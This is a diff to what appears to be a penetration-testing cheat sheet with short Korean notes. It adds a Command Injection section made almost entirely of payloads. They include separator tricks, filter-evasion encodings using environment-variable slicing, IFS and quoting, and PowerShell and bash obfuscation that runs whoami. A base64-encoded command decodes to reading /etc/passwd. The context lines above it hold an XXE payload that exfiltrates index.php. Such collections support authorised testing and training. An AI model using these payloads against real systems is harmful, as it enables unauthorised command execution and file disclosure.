@@ -714,3 +714,59 @@ done
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
 <svg>&xxe;</svg>
 ```
+
+# Command Injection
+- front에서만 처리되는 validation 해제하고 실행해보기. 혹은 burpsuite로 우회하기.
+```bash
+echo ${PATH:0:1}
+
+echo ${HOME:0:1}
+
+echo ${PWD:0:1}
+
+echo ${LS_COLORS:10:1}
+```
+```powershell
+echo %HOMEPATH:~6,-11%
+
+$env:HOMEPATH[0]
+
+$env:PROGRAMFILES[10]
+```
+```
+127.0.0.1;whoami
+
+127.0.0.1&&whoami
+
+127.0.0.1||whoami
+
+127.0.0.1%0awhoami
+```
+```
+127.0.0.1%0a%09whoami
+
+127.0.0.1%0a${IFS}whoami
+
+127.0.0.1%0a{ls,-al}
+
+127.0.0.1${LS_COLORS:10:1}${IFS}
+```
+```
+127.0.0.1%0aw'h'o'am'i
+
+127.0.0.1%0aw"h"o"am"i
+
+# windows
+127.0.0.1%0aWhOaMi
+
+127.0.0.1%0aiex "$('imaohw'[-1..-20] -join '')"
+
+127.0.0.1%0a[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+
+# linux
+127.0.0.1%0a$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+
+127.0.0.1%0a$(rev<<<'imaohw')
+
+127.0.0.1%0abash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+```
